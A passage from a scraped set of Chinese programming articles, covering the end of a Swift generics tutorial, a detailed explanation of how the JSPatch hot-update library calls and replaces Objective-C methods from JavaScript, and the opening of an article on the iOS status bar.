func findLargestInArray&lt;T&gt;(array: Array&lt;T&gt;) -&gt; T? {
  if array.isEmpty { return nil }
  var soFar : T = array[0]
  for i in 1..&lt;array.count {
    soFar = array[i] &gt; soFar ? array[i] : soFar
  }
  return soFar
}</code></pre>
<p>不过这样毫无限制的泛型对于编译器是非常不友好的，如上述代码中需要进行一个比较，即<code>array[i] &gt; soFar</code>，而我们只知道<code>array[i]</code>是类型T，并且<code>soFar</code>也是类型T。但是编译器根本不知道这个类型T能否进行比较。譬如我们创建一个空的结构体<code>Foo</code>，并且把它当做类型参数传了进来，那么我们压根不知道<code>&gt;</code>这个比较运算符能否起作用。</p>
<p>在上文对于Protocol的讨论中，我们已经尝试使用<code>:</code>为某个关联类型设置一些约束，而在刚才的例子中，如果传入的String类型是可以正常编译的，但是一旦传入的是NSView类型，则不能正常编译了。而我们可以以如下方式添加约束：</p>
<pre><code class=""swift"">// Note that &lt;T&gt; became &lt;T : Comparable&gt;, meaning that whatever type fills in
// 'T' must conform to Comparable.
func findLargestInArray&lt;T : Comparable&gt;(array: Array&lt;T&gt;) -&gt; T? {
  if array.isEmpty { return nil }
  var soFar : T = array[0]
  for i in 1..&lt;array.count {
    soFar = array[i] &gt; soFar ? array[i] : soFar
  }
  return soFar
}

// Example usage:
let arrayToTest = [1, 2, 3, 100, 12]
// We're calling 'findLargestInArray()' with T = Int.
if let result = findLargestInArray(arrayToTest) {
  print(""the largest element in the array is \(result)"")
} else {
  print(""the array was empty..."")
}
// prints: ""the largest element in the array is 100""

</code></pre>
<p>这是因为，在某种意义上，存在着一种悖论，越限制类型参数与添加约束，用户越能方便地使用这些参数。不加任何限制地类型参数往往只能使用在简单地交换或者从集合中添加或者删除某些元素。</p>
<h3>简单约束</h3>
<pre><code class=""swift"">func example&lt;T, U : Equatable, V : Hashable&gt;(foo: T, bar: U, baz: V) {
  // ...
}</code></pre>
<p>如果需要对泛型进行细粒度的控制，首先来讨论下在哪些地方可以进行控制处理：</p>
<ul>
<li><p>类似于U,V这样的类型参数，即上文中的普通的泛型参数</p></li>
<li><p>类型参数的关联类型，即上文中协议里的关联类型。</p></li>
</ul>
<p>Swift中提供了以下三个类型的约束：</p>
<ul>
<li><p><code>T : SomeProtocol</code>：类型T必须遵从协议<code>SomeProtocol</code>。需要注意，使用<code>protocol&lt;Foo,Bar&gt;</code>。</p></li>
<li><p><code>T==U</code>：类型参数T必须是类型参数或者关联类型U。</p></li>
<li><p><code>T:SomeClass</code>:T必须是一个类，更加具体而言，T必须是SomeClass的一个实例或者它的子类。</p></li>
</ul>
<h2>Putting it all together</h2>
<p>上文中已经介绍了基本的泛型的用法和约束，而对于泛型类型的签名可以综合使用如下：</p>
<ul>
<li><p>声明类型参数，如果愿意的话，最好每个类型参数都要声明遵循某个协议。</p></li>
<li><p>使用<code>where</code>关键字。</p></li>
<li><p>使用逗号分割声明约束。</p></li>
</ul>
<pre><code class=""swift"">protocol Foo {
  typealias Key
  typealias Element
}

protocol Bar {
  typealias RawGeneratorType
}

func example&lt;T : Foo, U, V where V : Foo, V : Bar, T.Key == V.RawGeneratorType, U == V.Element&gt;
  (arg1: T, arg2: U, arg3: V) -&gt; U {
  // ...
}</code></pre>
<p>不要惊慌，我们会一步一步地介绍这些泛型的用法。在<code>where</code>关键字之前，我们声明了三个类型参数：T，U以及V。其中T必须遵循Foo协议。而在where关键字之后，我们声明了四个约束：</p>
<ul>
<li><p>V必须遵循Foo协议。</p></li>
<li><p>V也必须实现了Bar协议。</p></li>
<li><p>由于T实现了Foo协议，T有一个关联类型为<code>T.Key</code>。V还有另一个关联类型，V.RawGeneratorType。这两个类型必须是相同的：T.Key == V.RawGeneratorType。</p></li>
<li><p>因为V实现了协议Foo，V包含一个关联类型V.Element。这个类型必须与U一致，U == V.Element。</p></li>
</ul>
<p>综上所述，无论何时使用<code>example()</code>函数时，必须要选择合适的T、U以及V类型。</p>
<h2>Constrained extensions</h2>
<p>Swift 2中新近提出了约束扩展的概念，一个更强大的能够使用泛型的语法特性。在Swift中，扩展允许向任意类型，即使尚未定义的类型中添加方法。同样允许向某个协议中添加默认的实现方法。同样的，这样的基于约束的扩展可以方便某些泛型的用法：</p>
<ul>
<li><p>对于像Array这样的泛型，可以在类型参数符合某个特定的约束的情况下添加某个方法。</p></li>
<li><p>对于像CollectionType这样包含关联类型的协议，可以当某个关联类型符合某个约束时添加默认的实现方法。</p></li>
</ul>
<h3>Syntax and limitations (语法与限制)</h3>
<p>基于约束的扩展语法如下所示：</p>
<pre><code class=""swift"">// Methods in this extension are only available to Arrays whose elements are
// both hashable and comparable.
extension Array where Element : Hashable, Element : Comparable {
  // ...
}</code></pre>
<p>where关键字跟随在类型参数之后，而后跟着以逗号分割的一系列泛型类型和参数。不过这其中的约束中并不能限定为非泛型，即：</p>
<pre><code class=""swift"">// An extension on Array&lt;Int&gt;.
// Error: ""Same-type requirement makes generic parameter 'Element' non-generic""
extension Array where Element == Int {
  // ...
}</code></pre>
<p>同时，也不能进行协议的传递：</p>
<pre><code class=""swift"">protocol MyProtocol { /* ... */ }

// Only Arrays with comparable elements conform to MyProtocol.
// Error: ""Extension of type 'Array' with constraints cannot have an inheritance clause""
extension Array : MyProtocol where Element : Comparable {
  // ...
}</code></pre>

                ", Swift &amp; Cocoa 实战之泛型编程:Swift 中的泛型编程,1531972091,577,1,218,1,1,https://segmentfault.com/a/1190000003822838
138,1,0,6,"
                    
<p><a href=""https://github.com/bang590/JSPatch"" rel=""nofollow noreferrer"">JSPatch</a>以小巧的体积做到了让JS调用/替换任意OC方法，让iOS APP具备<a href=""http://blog.cnbang.net/works/2767/"" rel=""nofollow noreferrer"">热更新</a>的能力，在实现 JSPatch 过程中遇到过很多困难也踩过很多坑，有些还是挺值得分享的。本篇文章从基础原理、方法调用和方法替换三块内容介绍整个 JSPatch 的实现原理，并把实现过程中的想法和碰到的坑也尽可能记录下来。</p>
<h2>基础原理</h2>
<p>能做到通过JS调用和改写OC方法最根本的原因是 Objective-C 是动态语言，OC上所有方法的调用/类的生成都通过 Objective-C Runtime 在运行时进行，我们可以通过类名/方法名反射得到相应的类和方法：</p>
<pre><code class=""objc"">Class class = NSClassFromString(""UIViewController"");
id viewController = [[class alloc] init];
SEL selector = NSSelectorFromString(""viewDidLoad"");
[viewController performSelector:selector];</code></pre>
<p>也可以替换某个类的方法为新的实现：</p>
<pre><code class=""objc"">static void newViewDidLoad(id slf, SEL sel) {}
class_replaceMethod(class, selector, newViewDidLoad, @"""");</code></pre>
<p>还可以新注册一个类，为类添加方法：</p>
<pre><code class=""objc"">Class cls = objc_allocateClassPair(superCls, ""JPObject"", 0);
objc_registerClassPair(cls);
class_addMethod(cls, selector, implement, typedesc);</code></pre>
<p>对于 Objective-C 对象模型和动态消息发送的原理已有很多文章阐述得很详细，例如<a href=""http://blog.csdn.net/kesalin/article/details/6689226"" rel=""nofollow noreferrer"">这篇</a>，这里就不详细阐述了。理论上你可以在运行时通过类名/方法名调用到任何OC方法，替换任何类的实现以及新增任意类。所以 JSPatch 的原理就是：JS传递字符串给OC，OC通过 Runtime 接口调用和替换OC方法。这是最基础的原理，实际实现过程还有很多怪要打，接下来看看具体是怎样实现的。</p>
<h2>方法调用</h2>
<pre><code class=""js"">require('UIView')
var view = UIView.alloc().init()
view.setBackgroundColor(require('UIColor').grayColor())
view.setAlpha(0.5)</code></pre>
<p>引入JSPatch后，可以通过以上JS代码创建了一个 UIView 实例，并设置背景颜色和透明度，涵盖了require引入类，JS调用接口，消息传递，对象持有和转换，参数转换这五个方面，接下来逐一看看具体实现。</p>
<h3>1.require</h3>
<p>调用 <code>require('UIView')</code> 后，就可以直接使用 <code>UIView</code> 这个变量去调用相应的类方法了，require 做的事很简单，就是在JS全局作用域上创建一个同名变量，变量指向一个对象，对象属性<code>__isCls</code>表明这是一个 Class，<code>__clsName</code>保存类名，在调用方法时会用到这两个属性。</p>
<pre><code class=""js"">var _require = function(clsName) {
  if (!global[clsName]) {
    global[clsName] = {
      __isCls: 1,
      __clsName: clsName
    }
  }
  return global[clsName]
}</code></pre>
<p>所以调用require('UIView')后，就在全局作用域生成了 UIView 这个变量，指向一个这样一个对象：</p>
<pre><code class=""js"">{
  __isCls: 1,
  __clsName: ""UIView""
}</code></pre>
<h3>2.JS接口</h3>
<p>接下来看看 <code>UIView.alloc()</code> 是怎样调用的。</p>
<h4>旧实现</h4>
<p>对于这个调用的实现，一开始我的想法是，根据JS特性，若要让 <code>UIView.alloc()</code> 这句调用不出错，唯一的方法就是给 <code>UIView</code> 这个对象添加 <code>alloc</code> 方法，不然是不可能调用成功的，JS对于调用没定义的属性/变量，只会马上抛出异常，而不像OC/Lua/ruby那样会有转发机制。所以做了一个复杂的事，就是在require生成类对象时，把类名传入OC，OC通过 Runtime 方法找出这个类所有的方法返回给JS，JS类对象为每个方法名都生成一个函数，函数内容就是拿着方法名去OC调用相应方法。生成的 UIView 对象大致是这样的：</p>
<pre><code class=""js"">{
    __isCls: 1,
    __clsName: ""UIView"",
    alloc: function() {…},
    beginAnimations_context: function() {…},
    setAnimationsEnabled: function(){…},
    ...
}</code></pre>
<p>实际上不仅要遍历当前类的所有方法，还要循环找父类的方法直到顶层，整个继承链上的所有方法都要加到JS对象上，一个类就有几百个方法，这样把方法全部加到JS对象上，碰到了挺严重的问题，引入几个类就内存暴涨，无法使用。后来为了优化内存问题还在JS搞了继承关系，不把继承链上所有方法都添加到一个JS对象，避免像基类 NSObject 的几百个方法反复添加在每个JS对象上，每个方法只存在一份，JS对象复制了OC对象的继承关系，找方法时沿着继承链往上找，结果内存消耗是小了一些，但还是大到难以接受。</p>
<h4>新实现</h4>
<p>当时继续苦苦寻找解决方案，若按JS语法，这是唯一的方法，但若不按JS语法呢？突然脑洞开了下，CoffieScript/JSX都可以用JS实现一个解释器实现自己的语法，我也可以通过类似的方式做到，再进一步想到其实我想要的效果很简单，就是调用一个不存在方法时，能转发到一个指定函数去执行，就能解决一切问题了，这其实可以用简单的字符串替换，把JS脚本里的方法调用都替换掉。最后的解决方案是，在OC执行JS脚本前，通过正则把所有方法调用都改成调用 <code>__c()</code> 函数，再执行这个JS脚本，做到了类似OC/Lua/Ruby等的消息转发机制：</p>
<pre><code class=""js"">UIView.alloc().init()
-&gt;
UIView.__c('alloc')().__c('init')()</code></pre>
<p>给JS对象基类 Object 的 prototype 加上 <code>__c</code> 成员，这样所有对象都可以调用到 <code>__c</code>，根据当前对象类型判断进行不同操作：</p>
<pre><code class=""js"">Object.prototype.__c = function(methodName) {
  if (!this.__obj &amp;&amp; !this.__clsName) return this[methodName].bind(this);
  var self = this
  return function(){
    var args = Array.prototype.slice.call(arguments)
    return _methodFunc(self.__obj, self.__clsName, methodName, args, self.__isSuper)
  }
}</code></pre>
<p><code>_methodFunc()</code> 就是把相关信息传给OC，OC用 Runtime 接口调用相应方法，返回结果值，这个调用就结束了。</p>
<p>这样做不用去OC遍历对象方法，不用在JS对象保存这些方法，内存消耗直降99%，这一步是做这个项目最爽的时候，用一个非常简单的方法解决了严重的问题，替换之前又复杂效果又差的实现。</p>
<h3>3.消息传递</h3>
<p>解决了JS接口问题，接下来看看JS和OC是怎样互传消息的。这里用到了 JavaScriptCore 的接口，OC端在启动JSPatch引擎时会创建一个 JSContext 实例，JSContext 是JS代码的执行环境，可以给 JSContext 添加方法，JS就可以直接调用这个方法：</p>
<pre><code class=""objc"">JSContext *context = [[JSContext alloc] init];
context[@""hello""] = ^(NSString *msg) {
    NSLog(@""hello %@"", msg);
};
[_context evaluateScript:@""hello('word')""];     //output hello word</code></pre>
<p>JS通过调用 JSContext 定义的方法把数据传给OC，OC通过返回值传会给JS。调用这种方法，它的参数/返回值 JavaScriptCore 都会自动转换，OC里的 NSArray, NSDictionary, NSString, NSNumber, NSBlock 会分别转为JS端的数组/对象/字符串/数字/函数类型。上述 <code>_methodFunc()</code> 方法就是这样把要调用的类名和方法名传递给OC的。</p>
<h3>4.对象持有/转换</h3>
<p><code>UIView.alloc()</code> 通过上述消息传递后会到OC执行 <code>[UIView alloc]</code>，并返回一个UIView实例对象给JS，这个OC实例对象在JS是怎样表示的呢？怎样可以在JS拿到这个实例对象后可以直接调用它的实例方法 <code>(UIView.alloc().init())</code>？</p>
<p>对于一个自定义id对象，JavaScriptCore 会把这个自定义对象的指针传给JS，这个对象在JS无法使用，但在回传给OC时OC可以找到这个对象。对于这个对象生命周期的管理，按我的理解如果JS有变量引用时，这个OC对象引用计数就加1 ，JS变量的引用释放了就减1，如果OC上没别的持有者，这个OC对象的生命周期就跟着JS走了，会在JS进行垃圾回收时释放。</p>
<p>传回给JS的变量是这个OC对象的指针，如果不经过任何处理，是无法通过这个变量去调用实例方法的。所以在返回对象时，JSPatch 会对这个对象进行封装。</p>
<p>首先，告诉JS这是一个OC对象：</p>
<pre><code class=""objc"">static NSDictionary *toJSObj(id obj)
{
    if (!obj) return nil;
    return @{@""__isObj"": @(YES), @""cls"": NSStringFromClass([obj class]), @""obj"": obj};
}</code></pre>
<p>用__isObj表示这是一个OC对象，对象指针也一起返回。接着在JS端会把这个对象转为一个 JSClass 实例：</p>
<pre><code class=""js"">var JSClass
var _getJSClass = function(className) {
  if (!JSClass) {
    JSClass = function(obj, className, isSuper) {
        this.__obj = obj
        this.__isSuper = isSuper
        this.__clsName = className
    }
  }
  return JSClass
}

var _toJSObj = function(meta) {
  var JSClass = _getJSClass()
  return new JSClass(meta[""obj""], meta[""cls""])
}</code></pre>
<p>JS端如果发现返回是一个OC对象，会传入 <code>_toJSObj()</code>，生成一个 <code>JSClass</code> 实例，这个实例保存着OC对象指针，类名等。这个实例就是OC对象在 JSPatch 对应的JS对象，生命周期是一样的。</p>
<p>回到我们第二点说的 JS接口， 这个 JSClass 实例对象同样有 <code>__c</code> 函数，调用这个对象的方法时，同样走到 <code>__c</code> 函数， <code>__c</code> 函数会把JSClass实例对象里的OC对象指针以及要调用的方法名和参数回传给OC，这样OC就可以调用这个对象的实例方法了。</p>
<p>接着看看对象是怎样回传给OC的。上述例子中，<code>view.setBackgroundColor(require('UIColor').grayColor())</code>，这里生成了一个 UIColor 实例对象，并作为参数回传给OC。根据上面说的，这个 UIColor 实例在JS中的表示是一个 JSClass 实例，所以不能直接回传给OC，这里的参数实际上会在 <code>__c</code> 函数进行处理，会把对象的 <code>.__obj</code> 原指针回传给OC。</p>
<p>最后一点，OC对象可能会存在于 NSDictionary / NSArray 等容器里，所以需要遍历容器挑出OC对象进行格式化，OC需要把对象都替换成JS认得的格式，JS要把对象转成 JSClass 实例，JS实例回传给OC时需要把实例转为OC对象指针。所以OC流出数据时都会经过 <code>formatOCObj()</code> 方法处理，JS从OC得到数据时都会经过 <code>_formatOCToJS()</code> 处理，JS传参数给OC时会经过 <code>_formatJSToOC()</code> 处理，图示：</p>
<p><span class=""img-wrap""><img data-src=""/img/bVptgy"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""JSPatch1.png"" title=""JSPatch1.png""></span></p>
<h3>5.类型转换</h3>
<p>JS把要调用的类名/方法名/对象传给OC后，OC调用类/对象相应的方法是通过 NSInvocation 实现，要能顺利调用到方法并取得返回值，要做两件事：</p>
<p>1.取得要调用的OC方法各参数类型，把JS传来的对象转为要求的类型进行调用。<br>2.根据返回值类型取出返回值，包装为对象传回给JS。</p>
<p>例如开头例子的 <code>view.setAlpha(0.5)</code>， JS传递给OC的是一个 NSNumber，OC需要通过要调用OC方法的 <code>NSMethodSignature</code> 得知这里参数要的是一个 float 类型值，于是把NSNumber转为float值再作为参数进行OC方法调用。这里主要处理了 int/float/bool 等数值类型，并对 CGRect/CGRange 等类型进行了特殊转换处理，剩下的就是实现细节了。</p>
<h2>方法替换</h2>
<p>JSPatch 可以用 <code>defineClass</code> 接口任意替换一个类的方法，方法替换的实现过程也是颇为曲折，一开始是用 va_list 的方式获取参数，结果发现 arm64 下不可用，只能转而用另一种hack方式绕道实现。另外在给类新增方法、实现property、支持self/super关键字上也费了些功夫，下面逐个说明。</p>
<h3>基础原理</h3>
<p>OC上，每个类都是这样一个结构体：</p>
<pre><code class=""objc"">struct objc_class {
  struct objc_class * isa;
  const char *name;
  ….
  struct objc_method_list **methodLists; /*方法链表*/
};</code></pre>
<p>其中 methodList 方法链表里存储的是Method类型：</p>
<pre><code class=""objc"">typedef struct objc_method *Method;
typedef struct objc_ method {
  SEL method_name;
  char *method_types;
  IMP method_imp;
};</code></pre>
<p>Method 保存了一个方法的全部信息，包括SEL方法名，type各参数和返回值类型，IMP该方法具体实现的函数指针。</p>
<p>通过 Selector 调用方法时，会从 methodList 链表里找到对应Method进行调用，这个 methodList 上的的元素是可以动态替换的，可以把某个 Selector 对应的函数指针IMP替换成新的，也可以拿到已有的某个 Selector 对应的函数指针IMP，让另一个 Selector 跟它对应，Runtime 提供了一些接口做这些事，以替换 UIViewController 的 <code>-viewDidLoad:</code> 方法为例：</p>
<pre><code class=""objc"">static void viewDidLoadIMP (id slf, SEL sel) {
   JSValue *jsFunction = …;
   [jsFunction callWithArguments:nil];
}

Class cls = NSClassFromString(@""UIViewController"");
SEL selector = @selector(viewDidLoad);
Method method = class_getInstanceMethod(cls, selector);

//获得viewDidLoad方法的函数指针
IMP imp = method_getImplementation(method)

//获得viewDidLoad方法的参数类型
char *typeDescription = (char *)method_getTypeEncoding(method);

//新增一个ORIGViewDidLoad方法，指向原来的viewDidLoad实现
class_addMethod(cls, @selector(ORIGViewDidLoad), imp, typeDescription);

//把viewDidLoad IMP指向自定义新的实现
class_replaceMethod(cls, selector, viewDidLoadIMP, typeDescription);</code></pre>
<p>这样就把 UIViewController 的 <code>-viewDidLoad</code> 方法给替换成我们自定义的方法，APP里调用 UIViewController 的 <code>viewDidLoad</code> 方法都会去到上述 <code>viewDidLoadIMP</code> 函数里，在这个新的IMP函数里调用JS传进来的方法，就实现了替换 <code>-viewDidLoad</code> 方法为JS代码里的实现，同时为 UIViewController 新增了个方法 <code>-ORIGViewDidLoad</code> 指向原来 viewDidLoad 的IMP，JS可以通过这个方法调用到原来的实现。</p>
<p>方法替换就这样很简单的实现了，但这么简单的前提是，这个方法没有参数。如果这个方法有参数，怎样把参数值传给我们新的IMP函数呢？例如 UIViewController 的 <code>-viewDidAppear:</code> 方法，调用者会传一个Bool值，我们需要在自己实现的IMP（上述的viewDidLoadIMP）上拿到这个值，怎样能拿到？如果只是针对一个方法写IMP，是可以直接拿到这个参数值的：</p>
<pre><code class=""objc"">static void viewDidAppear (id slf, SEL sel, BOOL animated) {
   [function callWithArguments:@(animated)];
}</code></pre>
<p>但我们要的是实现一个通用的IMP，任意方法任意参数都可以通过这个IMP中转，拿到方法的所有参数回调JS的实现。</p>
<h3>va_list实现(32位)</h3>
<p>最初我是用可变参数va_list实现：</p>
<pre><code class=""objc"">static void commonIMP(id slf, ...)
  va_list args;
  va_start(args, slf);
  NSMutableArray *list = [[NSMutableArray alloc] init];
  NSMethodSignature *methodSignature = [cls instanceMethodSignatureForSelector:selector];
  NSUInteger numberOfArguments = methodSignature.numberOfArguments;
  id obj;
  for (NSUInteger i = 2; i &lt; numberOfArguments; i++) {
      const char *argumentType = [methodSignature getArgumentTypeAtIndex:i];
      switch(argumentType[0]) {
          case 'i':
              obj = @(va_arg(args, int));
              break;
          case 'B':
              obj = @(va_arg(args, BOOL));
              break;
          case 'f':
          case 'd':
              obj = @(va_arg(args, double));
              break;
          …… //其他数值类型
          default: {
              obj = va_arg(args, id);
              break;
          }
      }
      [list addObject:obj];
  }
  va_end(args);
  [function callWithArguments:list];
}</code></pre>
<p>这样无论方法参数是什么，有多少个，都可以通过 <code>va_list</code> 的一组方法一个个取出来，组成NSArray在调用JS方法时传回。很完美地解决了参数的问题，一直运行正常，直到我跑在arm64的机子上测试，一调用就crash。查了资料，才发现arm64下 <code>va_list</code> 的结构改变了，导致无法上述这样取参数。详见<a href=""https://blog.nelhage.com/2010/10/amd64-and-va_arg"" rel=""nofollow noreferrer"">这篇文章</a>。</p>
<h3>ForwardInvocation实现(64位)</h3>
<p>后来找到另一种非常hack的方法解决参数获取的问题，利用了OC消息转发机制。</p>
<p>当调用一个 NSObject 对象不存在的方法时，并不会马上抛出异常，而是会经过多层转发，层层调用对象的 <code>-resolveInstanceMethod:</code>, <code>-forwardingTargetForSelector:</code>, <code>-methodSignatureForSelector:</code>, <code>-forwardInvocation:</code> 等方法，<a href=""http://bugly.qq.com/blog/?p=64"" rel=""nofollow noreferrer"">这篇文章</a>说得比较清楚，其中最后 <code>-forwardInvocation:</code> 是会有一个 NSInvocation 对象，这个 NSInvocation 对象保存了这个方法调用的所有信息，包括 Selector 名，参数和返回值类型，最重要的是有所有参数值，可以从这个 NSInvocation 对象里拿到调用的所有参数值。我们可以想办法让每个需要被JS替换的方法调用最后都调到 <code>-forwardInvocation:</code>，就可以解决无法拿到参数值的问题了。</p>
<p>具体实现，以替换 UIViewController 的 <code>-viewWillAppear:</code> 方法为例：</p>
<ol>
<li><p>把UIViewController的 <code>-viewWillAppear:</code> 方法通过 <code>class_replaceMethod()</code> 接口指向一个不存在的IMP: <code>class_getMethodImplementation(cls, @selector(__JPNONImplementSelector))</code>，这样调用这个方法时就会走到 <code>-forwardInvocation:</code>。</p></li>
<li><p>为 UIViewController 添加 <code>-ORIGviewWillAppear:</code> 和 <code>-_JPviewWillAppear:</code> 两个方法，前者指向原来的IMP实现，后者是新的实现，稍后会在这个实现里回调JS函数。</p></li>
<li><p>改写 UIViewController 的 <code>-forwardInvocation:</code> 方法为自定义实现。一旦OC里调用 UIViewController 的 <code>-viewWillAppear:</code> 方法，经过上面的处理会把这个调用转发到 <code>-forwardInvocation:</code> ，这时已经组装好了一个 NSInvocation，包含了这个调用的参数。在这里把参数从 NSInvocation 反解出来，带着参数调用上述新增加的方法 <code>-JPviewWillAppear:</code> ，在这个新方法里取到参数传给JS，调用JS的实现函数。整个调用过程就结束了，整个过程图示如下：</p></li>
</ol>
<p><span class=""img-wrap""><img data-src=""/img/bVptks"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""JSPatch2.png"" title=""JSPatch2.png""></span></p>
<p>最后一个问题，我们把 UIViewController 的 <code>-forwardInvocation:</code> 方法的实现给替换掉了，如果程序里真有用到这个方法对消息进行转发，原来的逻辑怎么办？首先我们在替换 <code>-forwardInvocation:</code> 方法前会新建一个方法 <code>-ORIGforwardInvocation:</code>，保存原来的实现IMP，在新的 <code>-forwardInvocation:</code> 实现里做了个判断，如果转发的方法是我们想改写的，就走我们的逻辑，若不是，就调 <code>-ORIGforwardInvocation:</code> 走原来的流程。</p>
<p>实现过程中还碰到一个坑，就是从 <code>-forwardInvocation:</code> 里的 NSInvocation 对象取参数值时，若参数值是id类型，我们会这样取:</p>
<pre><code class=""objc"">id arg;
[invocation getArgument:&amp;arg atIndex:i];</code></pre>
<p>但这样取某些时候会导致莫名其妙的crash，而且不是crash在这个地方，似乎这里的指针取错导致后续的内存错乱，crash在各种地方，这个bug查了我半天才定位到这里，至今不知为什么。后来以这样的方式解决了：</p>
<pre><code class=""objc"">void *arg;
[invocation getArgument:&amp;arg atIndex:i];
id a = (__bridge id)arg;</code></pre>
<p>其他就是实现上的细节了，例如需要根据不同的返回值类型生成不同的IMP，要在各处处理参数转换等。</p>
<h3>新增方法</h3>
<p>在 JSPatch 刚开源时，是不支持为一个类新增方法的，因为觉得能替换原生方法就够了，新的方法纯粹添加在JS对象上，只在JS端跑就行了。另外OC为类新增方法需要知道各个参数和返回值的类型，需要在JS定一种方式把这些类型传给OC才能完成新增方法，比较麻烦。后来挺多人比较关注这个问题，不能新增方法导致 action-target 模式无法用，我也开始想有没有更好的方法实现添加方法。一开始想到，反正新增的方法都是JS在用，不如新增的方法返回值和参数全统一成id类型，这样就不用传类型了，但还是需要知道参数个数，后来跟Lancy聊天时找到了解决方案，JS可以获得函数参数个数，直接封装一下把参数个数一并传给OC就行了。</p>
<p>现在 <code>defineClass</code> 定义的方法会经过JS包装，变成一个包含参数个数和方法实体的数组传给OC，OC会判断如果方法已存在，就执行替换的操作，若不存在，就调用 <code>class_addMethod()</code> 新增一个方法，通过传过来的参数个数和方法实体生成新的 Method，把 Method 的参数和返回值类型都设为id。</p>
<p>这里有个问题，若某个类实现了某protocol，protocol方法里有可选的方法，它的参数不全是id类型，例如 <code>UITableViewDataSource</code> 的一个方法：</p>
<pre><code class=""objc"">- (NSInteger)tableView:(UITableView *)tableView sectionForSectionIndexTitle:(NSString *)title atIndex:(NSInteger)index;</code></pre>
<p>若原类没有实现这个方法，在JS里实现了，会走到新增方法的逻辑，每个参数类型都变成id，与这个 protocol 方法不匹配，产生错误。后续会处理 protocol 的问题，若新增的方法是 protocol 实现的方法，会取这个方法的 <code>NSMethodSignature</code> 获得正确的参数类型进行添加。</p>
<h3>Property实现</h3>
<pre><code class=""js"">defineClass('JPTableViewController : UITableViewController', {
  dataSource: function() {
    var data = self.getProp('data')
    if (data) return data;
    data = [1,2,3]
    self.setProp_forKey(data, 'data')
    return data;
  }
}</code></pre>
<p>JSPatch 可以通过 <code>-getProp:</code>， <code>-setProp:forKey:</code> 这两个方法给对象添加成员变量。实现上用了运行时关联接口 <code>objc_getAssociatedObject()</code> 和 <code>objc_setAssociatedObject()</code> 模拟，相当于把一个对象跟当前对象 self 关联起来，以后可以通过当前对象 self 找到这个对象，跟成员的效果一样，只是一定得是id对象类型。</p>
<p>本来OC有 <code>class_addIvar()</code> 可以为类添加成员，但必须在类注册之前添加完，注册完成后无法添加，这意味着可以为在JS新增的类添加成员，但不能为OC上已存在的类添加，所以只能用上述方法模拟。</p>
<h3>self关键字</h3>
<pre><code class=""js"">defineClass(""JPViewController: UIViewController"", {
  viewDidLoad: function() {
    var view = self.view()
    ...
  },
}</code></pre>
<p>JSPatch支持直接在 <code>defineClass</code> 里的实例方法里直接使用 self 关键字，跟OC一样 self 是指当前对象，这个 self 关键字是怎样实现的呢？实际上这个self是个全局变量，在 defineClass 里对实例方法 方法进行了包装，在调用实例方法之前，会把全局变量 self 设为当前对象，调用完后设回空，就可以在执行实例方法的过程中使用 self 变量了。这是一个小小的trick。</p>
<h3>super关键字</h3>
<pre><code class=""js"">defineClass(""JPViewController: UIViewController"", {
  viewDidLoad: function() {
    self.super.viewDidLoad()
  },
}</code></pre>
<p>OC里 super 是一个关键字，无法通过动态方法拿到 super，那么 JSPatch 的super是怎么实现的？实际上调用 super 的方法，OC做的事是调用父类的某个方法，并把当前对象当成 self 传入父类方法，我们只要模拟它这个过程就行了。</p>
<p>首先JS端需要告诉OC想调用的是当前对象的 super 方法，做法是调用 <code>self.super</code>时，会返回一个新的 <code>JSClass</code> 实例，这个实例同样保存了OC对象的引用，同时标识 <code>__isSuper=1</code>。</p>
<pre><code class=""js"">JSClass = function(obj, className, isSuper) {
    this.__obj = obj
    this.__isSuper = isSuper
    this.__clsName = className
}
JSClass.prototype.__defineGetter__('super', function(){
  if (!this.__super) {
    this.__super = new JSClass(this.__obj, this.__clsName, 1)
  }
  return this.__super
})</code></pre>
<p>调用方法时，<code>__isSuper</code> 会传给OC，告诉OC要调 super 的方法。OC做的事情是，如果是调用 super 方法，找到 superClass 这个方法的IMP实现，为当前类新增一个方法指向 super 的IMP实现，那么调用这个类的新方法就相当于调用 super 方法。把要调用的方法替换成这个新方法，就完成 super 方法的调用了。</p>
<pre><code class=""objc"">static id callSelector(NSString *className, NSString *selectorName, NSArray *arguments, id instance, BOOL isSuper) {
    ...
    if (isSuper) {
        NSString *superSelectorName = [NSString stringWithFormat:@""SUPER_%@"", selectorName];
        SEL superSelector = NSSelectorFromString(superSelectorName);

        Class superCls = [cls superclass];
        Method superMethod = class_getInstanceMethod(superCls, selector);
        IMP superIMP = method_getImplementation(superMethod);

        class_addMethod(cls, superSelector, superIMP, method_getTypeEncoding(superMethod));
        selector = superSelector;
    }
    ...
}</code></pre>
<h2>总结</h2>
<p>整个 JSPatch 实现原理就大致描述完了，剩下的一些小点，例如GCD接口，block实现，方法名下划线处理等就不细说了，可以直接看代码。JSPatch 还在持续改进中，希望能成为iOS平台动态更新的最佳解决方案，欢迎大家一起建设这个项目，github地址： <a href=""https://github.com/bang590/JSPatch"" rel=""nofollow noreferrer""></a><a href=""https://github.com/bang590/JSPatch/a"" rel=""nofollow noreferrer"">https://github.com/bang590/JSPatch</a></p>

                ", JSPatch 实现原理详解（一）,1531972093,195,1,112,1,1,https://segmentfault.com/a/1190000003648832
139,1,0,6,"
                    
<p>原文：<a href=""http://www.pchou.info/ios/2015/08/22/oc-statusbar.html"" rel=""nofollow noreferrer"">IOS状态栏和导航栏的控制问题</a></p>
<p>IOS的项目多数会遇到控制状态栏和导航栏的问题，比如隐藏状态栏、控制状态栏的文字颜色等，导航栏也有同样需求。本文总结一下操作方法。</p>
<p>首先一点，IOS的界面分为状态栏和导航栏，状态栏是指显示电池、时间的最顶部的一个窄条，高度为20个点；而导航栏是紧接着状态栏的44个点高度的横条，一般用于显示app标题，返回按钮等操作按钮。</p>
<p>在ios7之前，状态栏和导航栏是分开的，而从ios7开始状态栏和导航栏交织在一起了，状态栏变为透明，导航栏的高度变为44+20=64：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004841412"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>状态栏控制</h2>
<p>对状态栏的控制分两种情况：全局设置和分页面设置。控制这两种模式的开关是<code>info.plist</code>文件的<code>View controller-based status bar appearance</code>配置项。</p>
<h3>全局设置状态栏</h3>
